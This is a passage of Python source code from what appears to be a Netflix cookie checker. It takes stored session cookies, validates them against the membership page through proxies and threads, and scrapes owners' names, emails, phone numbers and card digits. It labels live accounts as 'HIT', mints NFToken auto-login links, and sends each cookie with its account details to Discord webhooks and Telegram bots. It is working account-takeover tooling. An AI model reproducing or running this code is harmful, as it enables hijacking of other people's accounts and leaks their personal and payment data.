        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": normalize_phone_number(phone_digits, phone_country_code),
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
        "emailVerified": format_boolean_label(email_verified),
        "phoneVerified": format_boolean_label(phone_verified_graphql),
        "profiles": ", ".join(profile_names) if profile_names else None,
    }

    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            info["maskedCard"] = payment_display_text
    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text

    if not info["paymentMethodType"] and payment_methods:
        if "Card" in payment_typename:
            info["paymentMethodType"] = "CC"

    return {key: value for key, value in info.items() if value not in (None, "", [], {})}


def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    extra_member_account_patterns = (
        r"assinante\s+extra\s+no\s+plano\s+de\s+outra\s+pessoa",
        r"suscriptor\s+extra\s+en\s+el\s+plan\s+de\s+otra\s+persona",
        r"extra\s+on\s+someone.?else.?s\s+plan",
        r"abbonato\s+extra\s+sul\s+piano\s+di\s+un.?altra\s+persona",
        r"abonn[ée]\s+suppl[ée]mentaire\s+sur\s+le\s+forfait\s+de\s+quelqu.?un\s+d.?autre",
        r"ekstra\s+uye\s+bir\s+baskasinin\s+planinda",
    )
    extra_member_by_response_text = any(
        re.search(pattern, response_text, re.IGNORECASE)
        for pattern in extra_member_account_patterns
    )
    if has_complete_account_info(graphql_info):
        extracted = dict(graphql_info)
    else:
        extracted = {
            "accountOwnerName": extract_first_match(
                response_text,
                [
                    r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"',
                    r'"accountOwnerName"\s*:\s*"([^"]+)"',
                    r'"name"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"firstName"\s*:\s*"([^"]+)"',
                ],
            ),
            "email": extract_first_match(
                response_text,
                [
                    r'"emailAddress"\s*:\s*"([^"]+)"',
                    r'"email"\s*:\s*"([^"]+)"',
                    r'"loginId"\s*:\s*"([^"]+)"',
                ],
            ),
            "countryOfSignup": extract_first_match(
                response_text,
                [
                    r'"currentCountry"\s*:\s*"([^"]+)"',
                    r'"countryOfSignup":\s*"([^"]+)"',
                ],
            ),
            "memberSince": extract_first_match(response_text, [r'"memberSince":\s*"([^"]+)"']),
            "nextBillingDate": extract_first_match(
                response_text,
                [
                    r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T',
                    r'"nextBillingDate"\s*:\s*"([^"]+)"',
                    r'"nextBilling"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                ],
            ),
            "userGuid": extract_first_match(response_text, [r'"userGuid":\s*"([^"]+)"']),
            "showExtraMemberSection": extract_bool_value(
                response_text,
                [
                    r'"showExtraMemberSection":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                    r'"showExtraMemberSection"\s*:\s*(true|false)',
                ],
            ),
            "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":\s*"([^"]+)"']),
            "maxStreams": extract_first_match(
                response_text,
                [
                    r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),',
                    r'"maxStreams"\s*:\s*"?([^",}]+)"?',
                ],
            ),
            "localizedPlanName": extract_first_match(
                response_text,
                [
                    r'"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"',
                    r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                    r'"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"',
                    r'"localizedPlanName"\s*:\s*"([^"]+)"',
                    r'"planName"\s*:\s*"([^"]+)"',
                ],
            ),
            "planPrice": extract_first_match(
                response_text,
                [
                    r'"formattedPlanPrice"\s*:\s*"([^"]+)"',
                    r'"formattedPrice"\s*:\s*"([^"]+)"',
                    r'"planPriceDisplay"\s*:\s*"([^"]+)"',
                    r'"displayPrice"\s*:\s*"([^"]+)"',
                    r'"planPrice"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                    r'"planPrice"[^}]+"value":"([^"]+)"',
                    r'planPrice[^}]+value[^}]+"([^"]+)"',
                    r'"price"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"planPrice"\s*:\s*"([^"]+)"',
                ],
            ),
            "paymentMethodExists": extract_bool_value(
                response_text,
                [
                    r'"paymentMethodExists":\s*\{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)',
                    r'"paymentMethodExists"\s*:\s*(true|false)',
                ],
            ),
            "paymentMethodType": extract_first_match(
                response_text,
                [
                    r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"paymentMethod"\s*:\s*"([^"]+)"',
                    r'"paymentType"\s*:\s*"([^"]+)"',
                    r'"paymentMethodType"\s*:\s*"([^"]+)"',
                ],
            ),
            "maskedCard": extract_first_match(
                response_text,
                [
                    r'"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"',
                    r'"paymentCardDisplayString"\s*:\s*"([^"]+)"',
                    r'"paymentMethodLast4"\s*:\s*"([^"]+)"',
                    r'"paymentMethodLastFour"\s*:\s*"([^"]+)"',
                    r'"lastFour"\s*:\s*"([^"]+)"',
                    r'"creditCardLast4"\s*:\s*"([^"]+)"',
                    r'"creditCardEndingDigits"\s*:\s*"([^"]+)"',
                    r'"paymentMethodDescription"\s*:\s*"([^"]+)"',
                    r'"maskedCard"\s*:\s*"([^"]+)"',
                    r'"cardNumber"\s*:\s*"([^"]+)"',
                ],
            ),
            "phoneNumber": extract_first_match(
                response_text,
                [
                    r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"',
                    r'"phoneNumber"\s*:\s*"([^"]+)"',
                    r'"mobilePhone"\s*:\s*"([^"]+)"',
                ],
            ),
            "phoneVerified": extract_bool_value(
                response_text,
                [
                    r'"phoneVerified"\s*:\s*(true|false)',
                    r'"isPhoneVerified"\s*:\s*(true|false)',
                ],
            ),
            "videoQuality": extract_first_match(
                response_text,
                [
                    r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
                    r'"videoQuality"\s*:\s*"([^"]+)"',
                    r'"quality"\s*:\s*"([^"]+)"',
                ],
            ),
            "holdStatus": extract_bool_value(
                response_text,
                [
                    r'"holdStatus"\s*:\s*(true|false)',
                    r'"holdStatus"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
                    r'"isUserOnHold"\s*:\s*(true|false)',
                    r'"isUserOnHold"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
                    r'"isOnHold"\s*:\s*(true|false)',
                    r'"pastDue"\s*:\s*(true|false)',
                    r'"isPastDue"\s*:\s*(true|false)',
                ],
            ),
            "emailVerified": extract_bool_value(
                response_text,
                [
                    r'"emailVerified"\s*:\s*(true|false)',
                    r'"isEmailVerified"\s*:\s*(true|false)',
                    r'"emailAddressVerified"\s*:\s*(true|false)',
                    r'"contactEmailVerified"\s*:\s*(true|false)',
                ],
            ),
            "profiles": extract_profile_names(response_text),
        }

        extracted = merge_info(graphql_info, extracted)

    extracted.setdefault("paymentMethodType", None)
    extracted.setdefault("paymentMethodExists", None)
    extracted.setdefault("maskedCard", None)
    extracted.setdefault("holdStatus", None)
    extracted.setdefault("emailVerified", None)
    extracted.setdefault("phoneNumber", None)
    extracted.setdefault("countryOfSignup", None)
    extracted.setdefault("membershipStatus", None)
    extracted.setdefault("localizedPlanName", None)

    if extra_member_by_response_text:
        extracted["isExtraMemberAccount"] = "Yes"

    extracted["localizedPlanName"] = (
        extracted["localizedPlanName"].replace("miembro u00A0extra", "(Extra Member)")
        if extracted["localizedPlanName"]
        else None
    )

    if not extracted["paymentMethodType"]:
        extracted["paymentMethodType"] = extracted["paymentMethodExists"]

    if extracted["maskedCard"] and re.fullmatch(r"\d{4}", extracted["maskedCard"]):
        if extracted.get("paymentMethodType") in {None, "", "Yes"}:
            extracted["paymentMethodType"] = "CC"

    if extracted["holdStatus"] is None:
        membership_status_key = normalize_plan_key(extracted.get("membershipStatus"))
        if membership_status_key == "current_member":
            extracted["holdStatus"] = "No"
        elif any(token in membership_status_key for token in ("hold", "past_due", "payment_retry", "paused", "suspend")):
            extracted["holdStatus"] = "Yes"

    if extracted["emailVerified"] is None and extracted.get("email"):
        extracted["emailVerified"] = "Yes"

    phone_number = extracted.get("phoneNumber")
    extracted["phoneDisplay"] = normalize_phone_number(phone_number, extracted.get("countryOfSignup"))

    profiles = extracted.get("profiles")
    if profiles:
        profile_count = len([name for name in profiles.split(", ") if name])
        extracted["profileCount"] = profile_count
        extracted["profilesDisplay"] = profiles
    else:
        extracted["profileCount"] = None
        extracted["profilesDisplay"] = None

    return extracted


def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"


def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except Exception:
                return None
        return None


def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    plan_aliases = {
        "premium": {"premium", "premium_extra_member", "extra_member_premium", "cao_cap", "caocap", "高级", "프리미엄", "プレミアム"},
        "standard_with_ads": {"standard_with_ads", "standardwithads", "estandar_con_anuncios", "padrao_com_anuncios"},
        "standard": {"standard", "estandar", "標準", "标准", "standardowy", "padrao", "standart", "스탠다드", "スタンダード"},
        "basic": {"basic", "basico", "basique", "basis", "基本", "베이직", "ベーシック", "temel"},
        "mobile": {"ponsel", "mobile", "seluler", "movil", "모바일", "モバイル"},
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)

    if streams is not None:
        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"


def is_extra_member_account(info):
    if not isinstance(info, dict):
        return False
    explicit_flag = decode_netflix_value(info.get("isExtraMemberAccount"))
    if explicit_flag:
        lowered_flag = explicit_flag.strip().lower()
        if lowered_flag in {"yes", "true", "1"}:
            return True
        if lowered_flag in {"no", "false", "0"}:
            return False
    localized_plan = decode_netflix_value(info.get("localizedPlanName")) or ""
    membership_status = decode_netflix_value(info.get("membershipStatus")) or ""
    markers_text = ("extra member", "miembro extra", "suscriptor extra", "membro extra", "assinante extra", "abbonato extra", "ekstra uye", "额外成员", "額外成員", "추가 회원")
    for value in [localized_plan, membership_status]:
        if not value:
            continue
        if any(marker in value.lower() for marker in markers_text):
            return True
    return False


def is_subscribed_account(info):
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    if status == "current_member":
        return True
    return is_extra_member_account(info)


def is_on_hold_account(info):
    hold_value = format_boolean_label((info or {}).get("holdStatus"))
    if hold_value is not None:
        return hold_value == "Yes"
    membership_status = normalize_plan_key((info or {}).get("membershipStatus"))
    return any(token in membership_status for token in ("hold", "past_due", "payment_retry", "paused", "suspend"))


def derive_output_plan_bucket(info, is_subscribed):
    plan_key, plan_name = derive_plan_info(info, is_subscribed)
    folder_label = get_canonical_output_label(plan_key)
    display_label = plan_name or folder_label
    if is_subscribed and is_extra_member_account(info):
        extra_plan_key = "extra_member_premium"
        extra_label = get_canonical_output_label(extra_plan_key)
        if extra_label == "Unknown":
            extra_label = f"{folder_label} (Extra Member)"
        return extra_plan_key, extra_label, extra_label
    return plan_key, folder_label, display_label


def generate_unknown_guid():
    return f"unknown{random.randint(10000000, 99999999)}"


def create_nftoken(cookie_dict, attempts=1):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id:
        return None, "Missing required cookies for NFToken"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        attempts = max(1, int(attempts))
    except Exception:
        attempts = 1

    last_error = "NFToken API error"
    for _ in range(attempts):
        try:
            response = requests.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=30,
                verify=False,
            )
            if response.status_code != 200:
                return None, last_error
            data = response.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = decode_netflix_value(token_data.get("token"))
            expires = token_data.get("expires")
            if token:
                return {
                    "token": token,
                    "expires_at_utc": get_nftoken_expiry_utc(expires),
                }, None
        except Exception:
            pass
    return None, last_error


def get_nftoken_mode(config):
    raw_value = config.get("nftoken", False)
    if isinstance(raw_value, bool):
        return "all" if raw_value else "false"
    raw_mode = str(raw_value).strip().lower()
    if raw_mode in {"false", "off", "none", "disabled", "disable", "0"}:
        return "false"
    if raw_mode in {"all", "true", "on", "1"}:
        return "all"
    if raw_mode == "both":
        return "both"
    return "all"


def get_add_emojis_mode(config):
    raw_value = (config or {}).get("add_emojis", "webhook")
    if isinstance(raw_value, bool):
        return "both" if raw_value else "false"
    raw_mode = str(raw_value).strip().lower()
    if raw_mode in {"false", "off", "none", "disabled", "disable", "0", "no"}:
        return "false"
    if raw_mode in {"txt", "file", "output"}:
        return "txt"
    if raw_mode in {"webhook", "notify", "notification", "telegram", "tg"}:
        return "webhook"
    return "both"


def should_add_emojis(config, target):
    mode = get_add_emojis_mode(config)
    normalized_target = str(target or "").strip().lower()
    if normalized_target == "txt":
        return mode in {"txt", "both"}
    if normalized_target in {"webhook", "notifications", "notify", "telegram"}:
        return mode in {"webhook", "both"}
    return False


def build_nftoken_links(token, mode):
    normalized_token = decode_netflix_value(token)
    normalized_mode = get_nftoken_mode({"nftoken": mode})
    if not normalized_token or normalized_mode == "false":
        return []
    if normalized_mode == "all":
        devices = {"pc", "mobile", "tv"}
    elif normalized_mode == "both":
        devices = {"pc", "mobile"}
    else:
        devices = set(normalized_mode.split("/"))
    links = [
        ("pc", "PC Login", f"https://netflix.com/?nftoken={normalized_token}"),
        ("mobile", "Phone Login", f"https://netflix.com/unsupported?nftoken={normalized_token}"),
        ("tv", "TV Login", f"https://netflix.com/tv2?nftoken={normalized_token}"),
    ]
    return [(label, url) for device, label, url in links if device in devices]


def get_nftoken_expiry_utc(expires=None):
    normalized = decode_netflix_value(expires)
    if isinstance(normalized, str):
        normalized = normalized.strip()
        if normalized.isdigit():
            try:
                normalized = int(normalized)
            except Exception:
                normalized = None
    if isinstance(normalized, (int, float)):
        try:
            timestamp = int(normalized)
            if len(str(abs(timestamp))) == 13:
                timestamp //= 1000
            return datetime.fromtimestamp(timestamp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        except Exception:
            pass
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")


def has_usable_nftoken(nftoken_data):
    if not isinstance(nftoken_data, dict):
        return False
    token = decode_netflix_value(nftoken_data.get("token"))
    if not token:
        return False
    if str(token).strip().lower() in {"unavailable", "unknown", "none", "null", "false"}:
        return False
    return True


def normalize_output_value(value, unknown_fallback="UNKNOWN", na_when_false=False):
    cleaned = decode_netflix_value(value)
    if cleaned is None or cleaned == "":
        return unknown_fallback
    lowered = str(cleaned).strip().lower()
    if lowered in {"false", "none", "null"}:
        return "N/A" if na_when_false else unknown_fallback
    return cleaned


def normalize_calendar_year(year):
    try:
        year = int(year)
    except Exception:
        return None
    if 2400 <= year <= 2700:
        return year - 543
    return year


def parse_localized_date(cleaned):
    if not cleaned:
        return None
    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, parser)
        except Exception:
            continue
    iso_candidate = cleaned.replace("Z", "+00:00")
    try:
        return datetime.fromisoformat(iso_candidate)
    except Exception:
        pass
    numeric_parts = [int(part) for part in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            first = normalize_calendar_year(first)
            third = normalize_calendar_year(third)
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
        except Exception:
            pass
    return None


def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned


def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %Y")
    return cleaned


def normalize_phone_number(value, country_code=None):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    if str(cleaned).startswith("+"):
        return cleaned
    digits = re.sub(r"\D+", "", str(cleaned))
    if not digits:
        return cleaned
    return cleaned


def country_code_to_flag(country_code):
    raw = (decode_netflix_value(country_code) or "").strip()
    if not raw:
        return ""
    upper = raw.upper()
    if len(upper) == 2 and upper.isalpha():
        return "".join(chr(127397 + ord(char)) for char in upper)
    return ""


def format_country_with_flag(country_value, unknown_fallback="UNKNOWN"):
    normalized_country = normalize_output_value(country_value, unknown_fallback=unknown_fallback)
    country_flag = country_code_to_flag(normalized_country)
    if country_flag:
        return f"{normalized_country} {country_flag}"
    return normalized_country


def build_account_detail_lines(config, info, is_subscribed, include_country_flag=True):
    txt_fields = config.get("txt_fields", {})
    free_hidden_fields = {
        "member_since", "next_billing", "payment_method", "card", "phone",
        "quality", "max_streams", "plan_price", "extra_members", "membership_status",
    }
    _, normalized_plan_label = derive_plan_info(info, is_subscribed)
    country_value = info.get("countryOfSignup")
    rendered_country = (
        format_country_with_flag(country_value)
        if include_country_flag else
        normalize_output_value(country_value)
    )
    values = {
        "name": normalize_output_value(info.get("accountOwnerName")),
        "email": normalize_output_value(info.get("email")),
        "country": rendered_country,
        "plan": normalize_output_value(normalized_plan_label),
        "member_since": format_member_since(info.get("memberSince")),
        "next_billing": format_display_date(info.get("nextBillingDate")),
        "payment_method": normalize_output_value(info.get("paymentMethodType"), na_when_false=True),
        "card": normalize_output_value(info.get("maskedCard"), unknown_fallback="N/A", na_when_false=True),
        "phone": normalize_output_value(info.get("phoneDisplay")),
        "quality": normalize_output_value(info.get("videoQuality")),
        "max_streams": normalize_output_value((info.get("maxStreams") or "").rstrip("}")),
        "plan_price": normalize_output_value(info.get("planPrice"), unknown_fallback="N/A"),
        "hold_status": normalize_output_value(info.get("holdStatus")),
        "extra_members": normalize_output_value(info.get("showExtraMemberSection")),
        "email_verified": normalize_output_value(info.get("emailVerified")),
        "membership_status": normalize_output_value(info.get("membershipStatus")),
        "profiles": normalize_output_value(info.get("profilesDisplay")),
        "user_guid": normalize_output_value(info.get("userGuid")),
    }
    labels = [
        ("name", "Name"), ("email", "Email"), ("country", "Country"), ("plan", "Plan"),
        ("member_since", "Member Since"), ("next_billing", "Next Billing"), ("payment_method", "Payment"),
        ("card", "Card"), ("phone", "Phone"), ("quality", "Quality"), ("max_streams", "Streams"),
        ("plan_price", "Price"), ("hold_status", "Hold Status"), ("extra_members", "Extra Member"),
        ("email_verified", "Email Verified"), ("membership_status", "Membership Status"),
        ("profiles", "Profiles"), ("user_guid", "User GUID"),
    ]

    lines = []
    for key, label in labels:
        if not is_subscribed and key in free_hidden_fields:
            continue
        if key == "card" and str(values.get("payment_method", "")).strip().upper() != "CC":
            continue
        if key == "extra_members" and values.get(key) != "Yes":
            continue
        if key == "hold_status" and values.get(key) not in {"Yes", "No"}:
            continue
        if txt_fields.get(key, True):
            rendered_label = label
            if key == "profiles" and info.get("profileCount"):
                rendered_label = f"Profiles ({info['profileCount']})"
            lines.append(f"{rendered_label}: {values[key]}")
    return lines


def format_cookie_file(info, cookie_content, config, is_subscribed, nftoken_data=None):
    nftoken_mode = get_nftoken_mode(config)
    divider = "-" * 98
    usable_nftoken = has_usable_nftoken(nftoken_data)

    lines = [f"NETFLIX {'HIT' if is_subscribed else 'FREE'}", ""]
    lines.extend(
        build_account_detail_lines(
            config,
            info,
            is_subscribed,
            include_country_flag=False,
        )
    )
    if is_subscribed and nftoken_mode != "false" and usable_nftoken:
        nftoken_links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
        lines.append("")
        lines.append(divider)
        lines.append("")
        lines.append("NFTOKEN DETAILS")
        lines.append("")
        lines.append(f"NFToken: {nftoken_data['token']}")
        for label, link in nftoken_links:
            lines.append(f"{label}: {link}")
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(f"Valid Till (UTC): {nftoken_data['expires_at_utc']}")

    lines.append("")
    lines.append(divider)
    lines.append("")
    lines.append(f"=== Checked by {CHANNEL_NAME} ===")
    lines.append("NETFLIX COOKIE")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")

    return "\n".join(lines)


def build_notification_details(config, info, is_subscribed):
    status = "Subscribed" if is_subscribed else "Working (No Subscription)"
    if not is_subscribed:
        _, normalized_plan_label = derive_plan_info(info, is_subscribed)
        profiles_value = normalize_output_value(info.get("profilesDisplay"))
        profile_count = info.get("profileCount")
        profile_label = f"Profiles ({profile_count})" if profile_count else "Profiles"
        lines = [
            f"Name: {normalize_output_value(info.get('accountOwnerName'))}",
            f"Email: {normalize_output_value(info.get('email'))}",
            f"Country: {format_country_with_flag(info.get('countryOfSignup'))}",
            f"Plan: {normalize_output_value(normalized_plan_label)}",
            f"Email Verified: {normalize_output_value(info.get('emailVerified'))}",
            f"{profile_label}: {profiles_value}",
            f"User GUID: {normalize_output_value(info.get('userGuid'))}",
        ]
    else:
        lines = build_account_detail_lines(config, info, is_subscribed)
    return [f"Status: {status}"] + lines


def _escape_html(text):
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )


def build_discord_full_message(config, info, is_subscribed):
    lines = ["# Netflix Cookie", "", "Cookie details"]
    for line in build_notification_details(config, info, is_subscribed):
        label, value = line.split(": ", 1)
        lines.append(f"**{label}:** {value}")
    return "\n".join(lines)


def build_telegram_full_message(config, info, is_subscribed):
    lines = [f"<b>{CHANNEL_NAME} — Netflix Cookie</b>", "", "<b>Cookie details</b>"]
    for line in build_notification_details(config, info, is_subscribed):
        label, value = line.split(": ", 1)
        lines.append(f"<b>{_escape_html(label)}:</b> {_escape_html(value)}")
    return "\n".join(lines)


def send_discord_webhook(webhook_url, message_text, file_name=None, file_content=None):
    if not webhook_url:
        return
    try:
        webhook_payload = {
            "content": message_text,
            "flags": 4,
            "username": DISCORD_WEBHOOK_USERNAME,
            "avatar_url": DISCORD_WEBHOOK_AVATAR_URL,
        }
        if file_name and file_content:
            files = {"file": (file_name, file_content.encode("utf-8"), "text/plain")}
            data = {"payload_json": json.dumps(webhook_payload)}
            requests.post(webhook_url, data=data, files=files, timeout=20)
        else:
            requests.post(webhook_url, json=webhook_payload, timeout=20)
    except Exception:
        pass


def send_telegram(bot_token, chat_id, message_text, file_name=None, file_content=None):
    if not bot_token or not chat_id:
        return
    try:
        if file_name and file_content:
            doc_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            files = {"document": (file_name, file_content.encode("utf-8"), "text/plain")}
            data = {"chat_id": chat_id, "caption": message_text, "parse_mode": "HTML"}
            requests.post(doc_url, data=data, files=files, timeout=20)
        else:
            msg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message_text, "parse_mode": "HTML", "disable_web_page_preview": True}
            requests.post(msg_url, json=payload, timeout=20)
    except Exception:
        pass


def send_notifications(config, info, is_subscribed, output_filename, formatted_cookie):
    notifications = config.get("notifications", {})
    webhook_cfg = notifications.get("webhook", {})
    telegram_cfg = notifications.get("telegram", {})
    plan_key, _ = derive_plan_info(info or {}, is_subscribed)

    if webhook_cfg.get("enabled", False) and is_plan_allowed_for_notifications(webhook_cfg, plan_key):
        send_discord_webhook(
            webhook_cfg.get("url", ""),
            build_discord_full_message(config, info, is_subscribed),
            output_filename,
            formatted_cookie,
        )

    if telegram_cfg.get("enabled", False) and is_plan_allowed_for_notifications(telegram_cfg, plan_key):
        send_telegram(
            telegram_cfg.get("bot_token", ""),
            telegram_cfg.get("chat_id", ""),
            build_telegram_full_message(config, info, is_subscribed),
            output_filename,
            formatted_cookie,
        )


def get_account_page(session, proxy=None, request_timeout=15):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept-Encoding": "identity",
    }
    membership_url = "https://www.netflix.com/account/membership"
    response = session.get(membership_url, headers=headers, proxies=proxy, timeout=request_timeout)
    if response.status_code == 200 and response.text:
        primary_info = extract_info(response.text)
        return response.text, response.status_code, primary_info
    return response.text, response.status_code, None


def check_cookies(num_threads=30, config=None, use_proxies=True):
    if config is None:
        config = copy.deepcopy(DEFAULT_CONFIG)
    create_base_folders()

    stop_requested = threading.Event()
    proxies = load_proxies() if use_proxies else []
    retries_cfg = config.get("retries", {})
    performance_cfg = config.get("performance", {})
    max_retry_attempts = retries_cfg.get("error_proxy_attempts", 5)
    nftoken_retry_attempts = retries_cfg.get("nftoken_attempts", 5)
    request_timeout_seconds = performance_cfg.get("request_timeout_seconds", 15)
    nftoken_for_free = bool(performance_cfg.get("nftoken_for_free", False))
    retryable_status_codes = {403, 429, 500, 502, 503, 504}

    cookie_files = os.listdir(cookies_folder) if os.path.exists(cookies_folder) else []
    cookie_files = [f for f in cookie_files if f.lower().endswith((".txt", ".json"))]
    cookie_tasks = []

    for cookie_file in cookie_files:
        cookie_path = os.path.join(cookies_folder, cookie_file)
        try:
            with open(cookie_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception:
            cookie_tasks.append({"kind": "read_error", "cookie_file": cookie_file, "cookie_path": cookie_path})
            continue

        bundles = extract_netflix_cookie_bundles(content)
        if not bundles:
            cookie_tasks.append({"kind": "missing_cookies", "cookie_file": cookie_file, "cookie_path": cookie_path})
            continue

        bundle_total = len(bundles)
        for bundle in bundles:
            bundle_index = bundle.get("index", 1)
            cookie_tasks.append(
                {
                    "kind": "bundle",
                    "cookie_file": cookie_file,
                    "cookie_path": cookie_path,
                    "bundle": bundle,
                    "bundle_index": bundle_index,
                    "bundle_total": bundle_total,
                    "bundle_file": build_bundle_filename(cookie_file, bundle_index, bundle_total),
                    "bundle_label": build_bundle_display_name(cookie_file, bundle_index, bundle_total),
                    "remove_source_during_result": bundle_total <= 1,
                }
            )

    cookies_total = len(cookie_tasks)
    task_queue = queue.Queue()
    for cookie_task in cookie_tasks:
        task_queue.put(cookie_task)

    print()
    print(out_c("  ┌──────────────────────────────────────────────┐", GREY))
    print(out_c("  │", GREY) + f"  cookies : {out_c(str(cookies_total), LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  │", GREY) + f"  threads : {out_c(str(num_threads), LGREEN):<34}" + out_c("│", GREY))
    mode = "direct" if not proxies else f"{len(proxies)} proxies"
    print(out_c("  │", GREY) + f"  proxy   : {out_c(mode, LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  └──────────────────────────────────────────────┘", GREY))
    print()

    status_box = TopStatus(total=cookies_total)
    status_box.draw_initial()

    file_locks = {
        "hits": threading.Lock(),
        "free": threading.Lock(),
        "dup": threading.Lock(),
    }

    def get_next_proxy(used_proxy_indices):
        if not proxies:
            return None, None
        available = [idx for idx in range(len(proxies)) if idx not in used_proxy_indices]
        if not available:
            available = list(range(len(proxies)))
        chosen_index = random.choice(available)
        return proxies[chosen_index], chosen_index

    def build_hit_filepath(info, plan_name, country, user_guid, random_suffix):
        safe_plan = sanitize_filename_part(plan_name, "PLAN")
        safe_country = sanitize_filename_part(country, "UNKNOWN")
        safe_guid = sanitize_filename_part(user_guid, "GUID")
        base_name = f"{safe_plan}_{safe_country}_{safe_guid}_{random_suffix}.txt"
        candidate = os.path.join(HITS_DIR, base_name)
        counter = 1
        while os.path.exists(candidate):
            candidate = os.path.join(HITS_DIR, f"{safe_plan}_{safe_country}_{safe_guid}_{random_suffix}_{counter}.txt")
            counter += 1
